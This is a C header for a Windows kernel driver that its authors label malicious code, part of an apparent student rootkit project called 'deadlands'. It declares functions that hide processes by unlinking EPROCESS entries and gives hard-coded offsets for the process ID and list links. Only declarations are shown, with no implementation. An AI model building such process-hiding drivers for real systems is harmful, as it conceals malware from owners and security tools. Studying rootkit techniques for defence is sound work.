/*
**
** Malicious Code - Project: deadlands
** Filename	: [ deadlands-dkom.h ]
** Method	: [ Direct Kernel Object Manipulation ]
** Epi-Tek4 : [ Armand Morgan, Hochwelker Florent, Toumi Majdi ]
**
*/

#ifndef __DEADLANDS_DKOM_H__
# define __DEADLANDS_DKOM_H__

#include <ntddk.h>

/*
** - Defines:
*/
# define DEVICE_NAME	L"\\Device\\DeadlandsDKOM"
# define DOSDEVICE_NAME	L"\\DosDevices\\DeadlandsDKOM"

# define OFFSET_PID		0x84
# define OFFSET_FLINK	0x88
# define OFFSET_BLINK	0x8c

/* #if defined(WIN_2000) */
/* # define OFFSET_PID		0x94 */
/* # define OFFSET_FLINK	0xA0 */
/* # define OFFSET_BLINK	0xA4 */
/* #elif defined(WIN_XP) */
/* # define OFFSET_PID		0x9C */
/* # define OFFSET_FLINK	0x88 */
/* # define OFFSET_BLINK	0x8C */
/* #elif defined(WIN_2003) */
/* # define OFFSET_PID		0x84 */
/* # define OFFSET_FLINK	0x88 */
/* # define OFFSET_BLINK	0x8C */
/* #endif */

/*
** - Type definitions:
*/
typedef int				INT32;
typedef unsigned long	DWORD;

typedef struct		_MyList
{
	PLIST_ENTRY		Node;
	INT32			Pid;
	struct _MyList	*Next;
}					MyList, *pMyList;

/*
** - Function prototypes:
*/
// DRIVER FUNCTIONS:
NTSTATUS	DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath);
NTSTATUS	DriverUnload(PDRIVER_OBJECT pDriverObject);
NTSTATUS	DriverIrpUnsupported(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);
NTSTATUS	DriverIrpCreate(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);
NTSTATUS	DriverIrpClose(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);
NTSTATUS	DriverIrpWrite(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);

// ALGORITHM: DKOM
NTSTATUS	HideProcess(INT32 pid);
NTSTATUS	ViewProcess(INT32 pid);
DWORD		GetEPROCESS(INT32 pid);

#endif /* !__DEADLANDS_DKOM_H__ */
